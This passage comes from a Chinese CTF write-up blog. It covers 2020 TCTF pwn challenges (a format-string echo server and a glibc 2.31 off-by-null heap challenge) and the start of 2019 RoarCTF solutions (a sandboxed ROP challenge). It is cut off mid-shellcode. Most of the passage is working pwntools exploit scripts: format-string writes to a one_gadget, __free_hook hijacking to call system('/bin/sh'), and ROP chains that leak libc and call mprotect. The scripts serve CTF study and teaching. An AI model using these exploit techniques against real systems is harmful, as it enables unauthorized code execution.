data-original="/2020/10/29/2020-tctf-yu-xuan-sai-he-jue-sai-bu-fen-pwn-ti-fu-pan/7.png"></div><p>栈迁移需要爆破栈地址半个字节，1/16概率；”*” + “%n” 方法需要 libc 低4个字节位于signed int的正数范围内，1/2 概率 </p><p>爆破成功要求：</p><p>1.由于printf输出长度最高0x7fffffff，所以我们需要libc后四位小于0x7fffffff 概率1/2</p><p>0x7fffffff</p><p>2.爆破最后一位stack地址，概率1/16</p><p>大概1/32</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/2020-tctf-yu-xuan-sai-he-jue-sai-bu-fen-pwn-ti-fu-pan/8.png"></div><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./simple_echoserver"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./simple_echoserver"</span><span class="token punctuation">)</span>one_gadget <span class="token operator">=</span> <span class="token number">0xe58c3</span><span class="token comment" spellcheck="true"># format_string = "%{}c%7$hhn".format(0x58-0xd,)</span><span class="token comment" spellcheck="true"># format_string = "%{}c%*30$c%26$n".format(0x7fdb135d6000 + one_gadget - 0x7fdb13664400 - 0x50)</span><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    format_string <span class="token operator">=</span> <span class="token string">"%{}c%7$hhn%{}c%*30$c%26$n"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token operator">-</span><span class="token number">0xd</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">,</span>one_gadget<span class="token operator">+</span><span class="token number">0x7fe3e7298000</span><span class="token operator">-</span><span class="token number">0x7fe3e7326400</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token operator">-</span><span class="token number">0xdb</span><span class="token operator">+</span><span class="token number">0xc3</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#%357715c%*30$c%26$n</span>    <span class="token comment" spellcheck="true"># gdb.attach(p,"b fprintf")</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"name: "</span><span class="token punctuation">,</span>format_string<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"phone: "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"yourself!\n"</span><span class="token punctuation">,</span><span class="token string">"~."</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"cat flag"</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        exp<span class="token punctuation">(</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./simple_echoserver"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./simple_echoserver"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="决赛-babyheap"><a href="#决赛-babyheap" class="headerlink" title="决赛-babyheap"></a>决赛-babyheap</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>2.31的off by null，利用largebin删除产生的chunk地址，以及fastbin删除产生的chunk地址来进行修改伪造，绕过合并时的unlink检查，以及伪造size位绕过pre_size的检查：（检查和2.29一致）</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/2020-tctf-yu-xuan-sai-he-jue-sai-bu-fen-pwn-ti-fu-pan/9.png"></div><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>debug <span class="token operator">=</span> <span class="token number">0</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"info"</span>se      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sea     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>rc      <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span>          <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">)</span>rl      <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims             <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">)</span>uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>itv     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># p = process("./babyheap")</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./babyheap'</span><span class="token punctuation">,</span>env<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'LD_PRELOAD'</span><span class="token punctuation">:</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./babyheap"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"chall.0ops.sjtu.edu.cn"</span><span class="token punctuation">,</span><span class="token number">2004</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./babyheap"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span><span class="token number">0x520</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0</span>    create<span class="token punctuation">(</span><span class="token number">0x5f8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 1</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">0x600</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0</span>    create<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 2</span>    edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x11</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x521</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x88"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># create 3~10</span>        create<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># delete 4~10</span>        delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">+</span>i<span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>          <span class="token comment" spellcheck="true"># delete 3</span>    delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>          <span class="token comment" spellcheck="true"># delete 2</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># create 2 3 4 5 6 7 8</span>        create<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># create 9</span>    edit<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"\xa0"</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">0x378</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true"># create 10</span>    edit<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">0x378</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x370</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x520</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#create(0x28)       # create 11</span>    <span class="token comment" spellcheck="true">#edit(11,9,p64(0)+"\xa0")</span>    <span class="token comment" spellcheck="true"># gdb.attach(p)</span>    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 1</span>    show<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x00007ffff7fb0be0</span><span class="token operator">+</span><span class="token number">0x7ffff7dc5000</span>    success<span class="token punctuation">(</span><span class="token string">"libc address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 8</span>    edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 3</span>    edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 12</span>    edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        exp<span class="token punctuation">(</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"cat /flag*"</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./babyheap'</span><span class="token punctuation">,</span>env<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'LD_PRELOAD'</span><span class="token punctuation">:</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./babyheap"</span><span class="token punctuation">)</span>        libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"chall.0ops.sjtu.edu.cn"</span><span class="token punctuation">,</span><span class="token number">2004</span><span class="token punctuation">)</span>        elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./babyheap"</span><span class="token punctuation">)</span>        libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 2020 Game </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2.29 largebin attack </tag>
            
            <tag> 2.29 io_str_flow 任意地址写 </tag>
            
            <tag> 2.29 off by one </tag>
            
            <tag> 非栈上的格式化字符串 </tag>
            
            <tag> 格式化字符串%*n的用法 </tag>
            
            <tag> 2.31 off by null </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 RoarCTF部分PWN题解</title>
      <link href="/2020/10/27/2019-roarctf-bu-fen-pwn-ti-jie/"/>
      <url>/2020/10/27/2019-roarctf-bu-fen-pwn-ti-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-Summary"><a href="#0x00-Summary" class="headerlink" title="0x00 Summary"></a>0x00 Summary</h1><p><strong>easyrop</strong>:栈溢出，绕过沙箱ORW<br><strong>eayheap</strong>：double free进行劫持hook<br><strong>eaay_pwn</strong>:利用off by one的方式进行overlapping，控制小chunk先进行泄露libcbase，再进行fastbin attack攻击，hijaking malloc_hook。<br><strong>realloc_magic</strong>:利用overlapping修改fd，使tcache指向stdout，由于其分配不用管chunk所以直接指向stdout位置就可以了泄露出libc地址，得到one_gadget。在进行一次overlapping分配到hook位置放入one_gadget即可。(ubuntu 18.04)</p><h1 id="0x01-easyrop"><a href="#0x01-easyrop" class="headerlink" title="0x01 easyrop"></a>0x01 easyrop</h1><h2 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/27/2019-roarctf-bu-fen-pwn-ti-jie/0.png"></div><h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>查看IDA：发现栈溢出漏洞：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/27/2019-roarctf-bu-fen-pwn-ti-jie/1.png"></div><p>v8代表栈上地址的位置，而v7又是我们写入的数据，同时v8我们是可以通过栈溢出来覆盖的。所以这里就产生了，栈溢出漏洞，我们可以修改返回地址。想system getshell？太天真了。。继续看</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/27/2019-roarctf-bu-fen-pwn-ti-jie/2.png"></div>沙箱保护，且没有办法修改其规则：我们先看看到底禁了那些系统调用：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/27/2019-roarctf-bu-fen-pwn-ti-jie/3.png"></div>execve被禁了，所以不能通过system来getshell。<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>首先需要利用rop来进行利用泄露libc地址之类的作用，那么怎么继续利用呢：这里需要补充到一个知识点：mprotect：</p><p>先了解这些：<br>int mprotect(const void *start, size_t len, int prot);<br>第一个参数：开始地址（该地址应是0x1000的倍数，以页方式对齐）<br>第二个参数：指定长度（长度也应该是0x1000的倍数）<br>第三个参数：指定属性<br>            可读可写可执行（0x111=7）</p><p>可以通过这个函数来修改写入数据的执行权限。修改写入数据执行权限之后我们就可以通过open等其他系统调用把flag读取出来。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python2</span><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> os<span class="token keyword">import</span> random<span class="token keyword">import</span> timecontext<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>execve_file <span class="token operator">=</span> <span class="token string">'./easyrop'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span>execve_file<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>execve_file<span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>layout <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x0000000000400640</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true"># : ret</span><span class="token number">0x0000000000401b93</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true"># : pop rdi ; ret</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x4019F3</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true"># main</span><span class="token punctuation">]</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x418</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span> <span class="token operator">+</span> flat<span class="token punctuation">(</span>layout<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># print p.recv()</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>data <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"libc_addr: "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>libc_addr<span class="token punctuation">)</span>layout <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x0000000000401b93</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true"># : pop rdi ; ret</span>elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'gets'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x0000000000401b93</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true"># : pop rdi ; ret</span>elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span><span class="token punctuation">,</span>libc_addr <span class="token operator">+</span> <span class="token number">0x00000000000202e8</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rsi; ret;</span><span class="token number">0x1000</span> <span class="token punctuation">,</span>libc_addr <span class="token operator">+</span> <span class="token number">0x0000000000001b96</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rdx; ret;</span><span class="token number">7</span> <span class="token punctuation">,</span>libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                      <span class="token punctuation">]</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x418</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span> <span class="token operator">+</span> flat<span class="token punctuation">(</span>layout<span class="token punctuation">)</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''mov rax, 